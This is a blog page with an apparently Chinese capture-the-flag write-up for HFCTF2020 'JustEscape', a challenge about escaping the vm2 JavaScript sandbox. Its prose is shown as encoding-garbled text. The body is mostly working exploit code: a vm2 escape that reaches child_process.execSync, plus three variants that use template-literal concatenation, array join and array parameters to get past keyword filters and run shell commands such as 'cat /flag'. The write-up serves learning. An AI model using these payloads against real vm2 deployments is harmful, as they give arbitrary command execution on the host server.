
<!DOCTYPE html>
<html lang="en" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HFCTF2020JustEscape - æœˆå‡ºä»äº‘</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="ä¸€é“VM2çš„æ²™ç®±é€ƒé€¸..
çŸ¥è¯†ç‚¹
æ²™ç®±é€ƒé€¸
Payloadæ‹¼æ¥(?)

åšé¢˜æ€è·¯è¿™é“é¢˜ç›®ä¼ªè£…æˆPHPæ˜¯çœŸæ»´æ¶å¿ƒï¼Œé¦–å…ˆæˆ‘ä»¬è®¿é—®å¯ä»¥å¾—åˆ°ä¸€ä¸ªç”¨Vueæ¡†æ¶å†™çš„é¡µé¢ï¼š

å°è¯•ç›´æ¥è®¿é—®index.phpçš„è¯å¯,"> 
    
    <link rel="alternative" href="atom.xml" title="æœˆå‡ºä»äº‘" type="application/atom+xml"> 
    <link rel="icon" href="/img/1.ico"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
<meta name="generator" content="Hexo 5.2.0"></head>

<body class="loading">
    <span id="config-title" style="display:none">æœˆå‡ºä»äº‘</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
    <div title="æ’­æ”¾/æš‚åœ" class="iconfont icon-play"></div>
    <h3 class="subtitle">HFCTF2020JustEscape</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="è·å–äºŒç»´ç " class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">HFCTF2020JustEscape</h1>
        <div class="stuff">
            <span>åäºŒæœˆ 17, 2020</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/BUU/" rel="tag">BUU</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Javascirpt/" rel="tag">Javascirpt</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" rel="tag">vm2æ²™ç®±é€ƒé€¸</a></li></ul>


        </div>
        <div class="content markdown">
            <p>ä¸€é“VM2çš„æ²™ç®±é€ƒé€¸..</p>
<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>æ²™ç®±é€ƒé€¸</li>
<li>Payloadæ‹¼æ¥(?)</li>
</ul>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>è¿™é“é¢˜ç›®ä¼ªè£…æˆPHPæ˜¯çœŸæ»´æ¶å¿ƒï¼Œé¦–å…ˆæˆ‘ä»¬è®¿é—®å¯ä»¥å¾—åˆ°ä¸€ä¸ªç”¨Vueæ¡†æ¶å†™çš„é¡µé¢ï¼š</p>
<p><img src="image-20201217143745895.png" alt="image-20201217143745895"></p>
<p>å°è¯•ç›´æ¥è®¿é—®index.phpçš„è¯å¯ä»¥å¾—åˆ°ä¸€æ®µphpæºç :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœä½ å°±ä¼šå‘ç°è¿™ä¸ªcodeæ˜¯æ²¡åŠ $ç¬¦å·çš„ä¹Ÿå°±æ˜¯è¯´ä»–æ²¡ç”¨..é‚£ä¹ˆå†å›åˆ°ä¹‹å‰çš„codeçš„éƒ¨åˆ†ï¼Œå¤§æ¦‚ä¹Ÿæ˜¯çœŸçš„evaläº†è¿™æ®µä»£ç ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯Javascript</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="built_in">Error</span>().stack</span><br></pre></td></tr></table></figure>



<p><img src="image-20201217144354519.png" alt="image-20201217144354519"></p>
<p>æœç„¶æ˜¯JSï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯VM2çš„æ²™ç®±ï¼Œé‚£ä¹ˆå¦‚ä½•æ²™ç®±é€ƒé€¸å‘¢ï¼ŸğŸ‘´ä¸€ç‚¹JSä¹Ÿä¸æ‡‚ï¼Œæ²¡æ³•å­åªèƒ½å»GITHUBä¸Šå«–ï¼Œæ‰¾åˆ°ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/225">vm2æ²™ç®±é€ƒé€¸</a>ï¼Œå¯ä»¥çœ‹åˆ°ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="function"><span class="title">catch</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°è¯•å¤åˆ¶ç²˜è´´ã€</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<p>å¥½çš„æ‰“ä¸è¿‡ï¼Œå€’åœ°åªèƒ½çœ‹WPäº†ï¼Œåˆ«äººç»™å‡ºçš„POCï¼š</p>
<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ƒ..?è¿™é‡Œçœ‹èµ·æ¥æ˜¯è¿›è¡Œäº†æ‹¼æ¥ï¼Œè‡ªå·±ä¸æ‡‚åŸç†çš„è¯å°±å…ˆå­¦ä¼šæ€ä¹ˆæ‹¼æ¥payloadå§,åœ¨JSä¸­æˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·æ¥ä»£æ›¿å•å¼•å·å’ŒåŒå¼•å·ï¼š</p>
<h3 id="çš„è¯­æ³•"><a href="#çš„è¯­æ³•" class="headerlink" title="`çš„è¯­æ³•"></a>`çš„è¯­æ³•</h3><p>ES6 æ¨¡æ¿å­—ç¬¦ä¸²(Template String)æ˜¯å¢å¼ºç‰ˆçš„å­—ç¬¦ä¸²ï¼Œç”¨åå¼•å·(`)æ ‡è¯†ï¼Œå®ƒå¯ä»¥å½“ä½œæ™®é€šå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å®šä¹‰å¤šè¡Œå­—ç¬¦ä¸²ï¼Œæˆ–è€…åœ¨å­—ç¬¦ä¸²ä¸­åµŒå…¥å˜é‡ã€‚<a target="_blank" rel="noopener" href="https://www.cnblogs.com/alummox/p/11343269.html">ä»‹ç»åšå®¢</a>,ä»æ­¤å¤„æˆ‘ä»¬å¯ä»¥å¾—åˆ°åå¼•å·ä½œç”¨ï¼š</p>
<ul>
<li>ä»£æ›¿å­—ç¬¦ä¸²çš„åŒå¼•å·å’Œå•å¼•å·</li>
<li>å¯ä»¥åŒ…å«ç‰¹å®šè¯­æ³•çš„å ä½ç¬¦</li>
<li>é…åˆ${}ç¬¦å·å¯ä»¥åŒ…å«å˜é‡</li>
</ul>
<p>ä¾‹å­ï¼š</p>
<p>åŸæœ¬æˆ‘ä»¬è¾“å‡ºå¤šè¡Œå­—ç¬¦ä¸²åº”è¯¥è¿™æ ·æ¥å†™ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;string text line 1\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;string text line 2&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨åå¼•å·ä¹‹å:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">`string text line 1</span></span><br><span class="line"><span class="string">string text line 2`</span>);</span><br></pre></td></tr></table></figure>

<p><img src="image-20201217151045490.png" alt="image-20201217151045490"></p>
<p>å½“å…¶ä¸${}æ­é…ä¹‹åæ›´æ˜¯å¯ä»¥å¤§å¤§é™ä½æˆ‘ä»¬ä¹¦å†™å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–é—®é¢˜ï¼š</p>
<p><img src="image-20201217151200088.png" alt="image-20201217151200088"></p>
<p>é‚£ä¹ˆç°åœ¨å›åˆ°é¢˜ç›®æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‹¼æ¥å˜é‡è¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦å…ˆç”¨åå¼•å·å°†éœ€è¦çš„ä¸œè¥¿åŒ…å«èµ·æ¥ï¼Œå†ç”¨${}å³å¯è¡¨ç¤ºä¸ºä¸€ä¸ªå˜é‡ï¼š</p>
<p><img src="image-20201217151634833.png" alt="image-20201217151634833"></p>
<h3 id="çš„è¯­æ³•-1"><a href="#çš„è¯­æ³•-1" class="headerlink" title="[]çš„è¯­æ³•"></a>[]çš„è¯­æ³•</h3><p>å¦‚æœä¸å…è®¸æˆ‘ä»¬ä½¿ç”¨ç‚¹å·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨[]æ¥ç»•è¿‡ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39125684/article/details/80327218">JSä¸­çš„ä¸­æ‹¬å·</a></p>
<p>è¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥ä»»æ„çš„ç»•è¿‡å…³é”®å‚æ•°åŒ¹é…ï¼Œæ‹¼æ¥å‡ºä¸Šå›¾çš„Payloadäº†</p>
<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC 2"></a>POC 2</h2><p>åˆ©ç”¨joinæ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼š</p>
<h3 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">()=&gt;</span>&#123; <span class="built_in">TypeError</span>[[<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`y`</span>,<span class="string">`p`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)][<span class="string">`a`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[[<span class="string">`c`</span>,<span class="string">`o`</span>,<span class="string">`n`</span>,<span class="string">`s`</span>,<span class="string">`t`</span>,<span class="string">`r`</span>,<span class="string">`u`</span>,<span class="string">`c`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`r`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`t`</span>,<span class="string">`u`</span>,<span class="string">`r`</span>,<span class="string">`n`</span>,<span class="string">` `</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))(); <span class="keyword">try</span>&#123; <span class="built_in">Object</span>[<span class="string">`preventExtensions`</span>](Buffer[<span class="string">`from`</span>](<span class="string">``</span>))[<span class="string">`a`</span>] = <span class="number">1</span>; &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123; <span class="keyword">return</span> e[<span class="string">`a`</span>](<span class="function">()=&gt;</span>&#123;&#125;)[<span class="string">`mainModule`</span>][[<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`q`</span>,<span class="string">`u`</span>,<span class="string">`i`</span>,<span class="string">`r`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`c`</span>,<span class="string">`h`</span>,<span class="string">`i`</span>,<span class="string">`l`</span>,<span class="string">`d`</span>,<span class="string">`_`</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))[[<span class="string">`e`</span>,<span class="string">`x`</span>,<span class="string">`e`</span>,<span class="string">`c`</span>,<span class="string">`S`</span>,<span class="string">`y`</span>,<span class="string">`n`</span>,<span class="string">`c`</span>][<span class="string">`join`</span>](<span class="string">``</span>)](<span class="string">`cat /flag`</span>)[<span class="string">`toString`</span>](); &#125; &#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>JSå½“ä¸­ä½¿ç”¨join()ä¸­æ·»åŠ å‚æ•°æ¥å†³å®šå¦‚ä½•æ‹¼æ¥ï¼Œå¦‚æœä¸æ·»åŠ é»˜è®¤ç”¨,åˆ†å‰²å¼€æ¥ï¼Œå¦‚æœä¸º0å°±ä¼šæ‹¼æ¥åœ¨ä¸€èµ·äº†</p>
<h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC 3"></a>POC 3</h2><h3 id="æ•°ç»„ç»•è¿‡"><a href="#æ•°ç»„ç»•è¿‡" class="headerlink" title="æ•°ç»„ç»•è¿‡"></a>æ•°ç»„ç»•è¿‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code[]=(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;cat /flag&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h1 id="VM2æ²™ç®±é€ƒé€¸åŸç†"><a href="#VM2æ²™ç®±é€ƒé€¸åŸç†" class="headerlink" title="VM2æ²™ç®±é€ƒé€¸åŸç†"></a>VM2æ²™ç®±é€ƒé€¸åŸç†</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207291">å…ˆä¸¢åœ¨è¿™ï¼Œä¸æ•¢ç¢°æˆ‘npmç¯å¢ƒç°åœ¨</a></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
                        
                    
                        
                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='false'
        data-ci=''
        data-cs=''
        data-r='https://github.com/ysllz/ysllz.github.io'
        data-o='https://github.com/ysllz/ysllz.github.io'
        data-a='ysllz'
        data-d='false'
    >æŸ¥çœ‹è¯„è®º</div>


    </div>
    
        <div class='side'>
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">çŸ¥è¯†ç‚¹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">åšé¢˜æ€è·¯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-1"><span class="toc-number">2.1.</span> <span class="toc-text">POC 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9A%84%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">&#96;çš„è¯­æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9A%84%E8%AF%AD%E6%B3%95-1"><span class="toc-number">2.1.2.</span> <span class="toc-text">[]çš„è¯­æ³•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-2"><span class="toc-number">2.2.</span> <span class="toc-text">POC 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JOIN"><span class="toc-number">2.2.1.</span> <span class="toc-text">JOIN</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-3"><span class="toc-number">2.3.</span> <span class="toc-text">POC 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.1.</span> <span class="toc-text">æ•°ç»„ç»•è¿‡</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">VM2æ²™ç®±é€ƒé€¸åŸç†</span></a></li></ol>	
        </div>
    
</div>


    </div>
</div>
</body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
